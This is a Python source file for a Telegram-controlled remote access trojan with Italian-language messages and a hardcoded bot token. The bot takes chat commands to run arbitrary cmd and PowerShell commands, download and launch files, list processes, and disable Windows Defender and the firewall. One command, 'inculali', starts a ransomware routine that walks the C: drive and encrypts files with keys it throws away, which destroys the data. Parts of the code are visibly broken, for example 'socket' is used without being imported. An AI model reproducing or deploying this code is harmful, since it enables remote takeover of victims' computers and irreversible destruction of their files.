import os
import urllib3
import random
import string
from cryptography.fernet import Fernet
from telegram.ext import *
from threading import Thread

keys = "5216257692:AAE6jR6NClBhXdCkHEdxC2fOYSL7Wf176TM"

def ran():
	dirs = []
	chrs = string.printable
	for files in os.walk("C:\\"):
		for file in files:
			key = Fernet.generate_key()
			f = Fernet(key)
			try:
				file_now = open(file, "a")
				file_data = file_now.read()
				file_data = file_data.encode()
				file_data = f.encrypt(file_data)
				file_now.close()
				file_now = open(file, "wb")
				file_now.write(file_data)
			except:
				pass

def ransom():
	for x in range(500):
		ran()

def sample_resp(input_text):
	user_message = str(input_text).lower()
	if "ls" in user_message:
		resp = os.popen("dir").read()
		resp = resp.replace("'","")
		return resp
	if "pwd" in user_message:
		resp = os.popen("pwd").read()
		resp = resp.replace("'","")
		return resp
	if "download" in user_message:
		http = urllib3.PoolManager()
		if "http://" in user_message:
			link = user_message.split("http://")
			link = "http://"+link[1]
			name = link.split(" --name=")
			name = name[0] + name[1]
		elif "https://" in user_message:
			link = user_message.split("https://")
			link = "https://"+link[1]
			name = link.split(" ")
			name = name[0] + name[1]
		else:
			return "Inserisci un link ed un nome nel messaggio\nComando: /download link nome estenzione"
		try:
			req = http.request("GET", link, preload_content=False)
			data = req.read()
			fl = open(name, "wb")
			fl.write(data)
			fl.close()
			return "File installato con il nome di " + name
		except:
			return "Impossibile creare il file"
	if "start_program" in user_message:
		if "--" in user_message:
			prg_name = user_message.split("--")
			prg_name = prg_name[1]
			os.system(prg_name)
			return "File avviato con successo"
		else:
			return "Inserisci -- prima della directory del file"
	if "processi" in user_message:
		procs = os.popen("tasklist").read()
		procs = procs.replace("'","")
		if "not found" not in procs:
			return procs
		else:
			return "Porcoddio non trovo i processi"
	if "inculali" in user_message:
		ram = Thread(target=ransom)
		ram.start()
		return "8:::::::::::::::::::::::::::::::::::::::::::::::::::::::D\ninculamento in corso, attendere prego"
	if "cmd" in user_message:
		if "-com" in user_message:
			comando = user_message.split("-com=")
			comando = comando[1]
			return os.popen(comando).read()
		else:
			return "Es. /cmd -com=comando"
	if "powershell" in user_message:
		if "-com" in user_message:
			comando = user_message.split("-com=")
			comando = comando[1]
			return os.popen("powershell -c '"+comando+"'").read()
		else:
			return "Es. /powershell -com=comando"
	if "stop_firewall" in user_message:
		try:
			lista_cmd = ["sc stop WinDefend", "sc config WinDefend start= disabled", " netsh advfirewall set allprofiles state off", 'powershell -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"']
			for cmd in lista_cmd:
				os.popen(cmd)
			return "[*]Stop Finished"
		except:
			return "[-]Stop Failed"
	if "connect" in user_message:
		if "-ip=" in user_message:
			ip = user_message.split("-ip=")
			ip = ip[1]
			if "-port=" in user_message:
				port = user_message.split("-port=")
				port = int(port[1])
				ip = ip.split(" ")
				ip = ip[0]
			else:
				port = 80
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				s.connect((ip,port))
				return "Connection success"
			except:
				return f"Impossible to connect on ip:{ip}"
		elif "-url=" in user_message:
			url = user_message.split("-url=")
			url = url[1]
			http = urllib3.PoolManager()
			http.request("GET", url)
			return "Request success"
		else:
			return "Es.\n/connect -ip=ip -port=porta\n/connect -url=url"

def start_command(update, context):
	update.message.reply_text("Scrivi qualcosa per iniziare")

def help_command(update, context):
	update.message.reply_text("Contatta il re degli hacker (@Vit8816)")

def lista_comandi(update,context):
	msg = "ls\npwd\ndownload\nstart_program\nprocessi\ninculali\ncmd\npowershell\nstop_firewall\nconnect"
	update.message.reply_text(msg)

def handle_message(update, context):
	text = str(update.message.text).lower()
	response = sample_resp(text)
	update.message.reply_text(response)

def error(update,context):
	return f"Update {update} caused error {context.error}"

def main():
	updt = Updater(keys, use_context=True)
	dp = updt.dispatcher
	dp.add_handler(CommandHandler("start", start_command))
	dp.add_handler(CommandHandler("help", help_command))
	dp.add_handler(CommandHandler("lista_comandi", lista_comandi))
	dp.add_handler(MessageHandler(Filters.text, handle_message))
	dp.add_error_handler(error)
	updt.start_polling()
	updt.idle()

main()